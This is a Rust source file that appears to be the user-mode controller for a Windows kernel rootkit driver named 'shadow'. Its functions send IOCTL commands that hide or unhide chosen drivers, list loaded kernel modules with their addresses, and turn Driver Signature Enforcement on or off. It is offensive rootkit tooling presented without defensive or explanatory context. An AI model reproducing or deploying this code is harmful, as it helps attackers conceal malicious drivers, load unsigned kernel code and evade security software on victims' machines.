use {
    core::mem::size_of, 
    shared::structs::{DriverInfo, TargetDriver, DSE}, 
    std::{ffi::c_void, ptr::null_mut}, 
    windows_sys::{
        w, 
        Win32::{
            Foundation::{
                CloseHandle, GetLastError, GENERIC_READ, GENERIC_WRITE, HANDLE, INVALID_HANDLE_VALUE
            }, 
        Storage::FileSystem::{
            CreateFileW, FILE_ATTRIBUTE_NORMAL, OPEN_EXISTING}, System::IO::DeviceIoControl
        }
    }
};

pub fn unhide_hide_driver(ioctl_code: u32, name: &String, enable: bool) {
    let h_file = open_driver().expect("Failed to open driver");
    let status;
    let mut info_driver = TargetDriver {
        name: name.to_string(),
        enable
    };    
    let mut return_buffer = 0;

    status = unsafe { 
            DeviceIoControl(
            h_file,
            ioctl_code,
            &mut info_driver as *mut _ as *mut c_void,
            std::mem::size_of::<TargetDriver>() as u32,
            null_mut(),
            0,
            &mut return_buffer,
            null_mut()
        )
    };

    if status == 0 {
        eprintln!("[!] DeviceIoControl Failed with status: 0x{:08X}", status);
    } else {
        println!("[+] Driver successfully hidden / unhidden")
    }

    unsafe { 
        CloseHandle(h_file);
    };
}

pub fn enumerate_driver(ioctl_code: u32) {
    let h_file = open_driver().expect("Failed to open driver");
    let mut driver_info: [DriverInfo; 400] = unsafe { std::mem::zeroed() };
    let mut return_buffer = 0;
    let status = unsafe { 
            DeviceIoControl(
            h_file,
            ioctl_code,
            null_mut(),
            0,
            driver_info.as_mut_ptr() as *mut _,
            (driver_info.len() * size_of::<DriverInfo>()) as u32,
            &mut return_buffer,
            null_mut()
        )
    };

    if status == 0 {
        eprintln!("[!] DeviceIoControl Failed with status: 0x{:08X}", status);
    } else {
        let total_module = return_buffer as usize / size_of::<DriverInfo>();
        println!("[+] Total modules: {}", total_module);
        for i in driver_info.iter() {
            if i.address > 0 {
                let name = match String::from_utf16(&i.name) {
                    Ok(name) => name,
                    Err(err) => {
                      eprintln!("[!] UTF-16 decoding error: {:?}", err);
                      continue;
                    }  
                };
                println!("[{}] {:?} {}", i.index, i.address as *mut c_void, name);
            }
        }
    }

    unsafe { 
        CloseHandle(h_file);
    };
}

pub fn dse(ioctl_code: u32, enable: bool) {
    let h_file = open_driver().expect("Failed to open driver");
    let status;
    let mut return_buffer = 0;
    let mut info_dse = DSE {
        enable
    };    

    status = unsafe { 
            DeviceIoControl(
            h_file,
            ioctl_code,
            &mut info_dse  as *mut _ as *mut c_void,
            std::mem::size_of::<DSE>() as u32,
            null_mut(),
            0,
            &mut return_buffer,
            null_mut()
        )
    };

    if status == 0 {
        eprintln!("[!] DeviceIoControl Failed with status: 0x{:08X}", status);
    } else {
        if enable {
            println!("[+] Driver Signature Enforcement (DSE) Enabled");
        } else {
            println!("[+] Driver Signature Enforcement (DSE) Disabled");
        }

    }

    unsafe { 
        CloseHandle(h_file);
    };
}

pub fn open_driver() -> Result<HANDLE, ()> {
    let h_file = unsafe {
        CreateFileW(
            w!("\\\\.\\shadow"),
            GENERIC_READ | GENERIC_WRITE,
            0,
            null_mut(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            0
        )
    };

    if h_file == INVALID_HANDLE_VALUE {
        unsafe { println!("[!] CreateFileW Failed With Error: {:?}", GetLastError()) };
        return Err(());
    }

    Ok(h_file)
}
